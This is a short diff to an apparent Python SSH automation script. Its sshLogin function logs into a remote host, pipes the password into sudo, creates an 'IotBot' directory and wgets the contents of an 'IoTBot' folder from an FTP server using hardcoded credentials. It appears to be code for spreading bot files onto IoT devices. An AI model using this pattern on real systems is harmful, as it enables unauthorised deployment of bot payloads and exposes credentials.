@@ -37,7 +37,9 @@ def sshLogin(user, ip, password):
         cd /home
         echo ''' + password + '''| sudo -S mkdir kabali
         cd kabali 
-        echo ''' + password + '''| sudo wget -r --user=user --password=abcd ftp://10.0.0.184/home/IoTBot/*
+        echo ''' + password + '''| sudo -S mkdir IotBot
+        cd IotBot
+        echo ''' + password + '''| sudo wget --user=user --password=abcd ftp://10.0.0.184:/IotBot/*
         ls
         exit
         '''
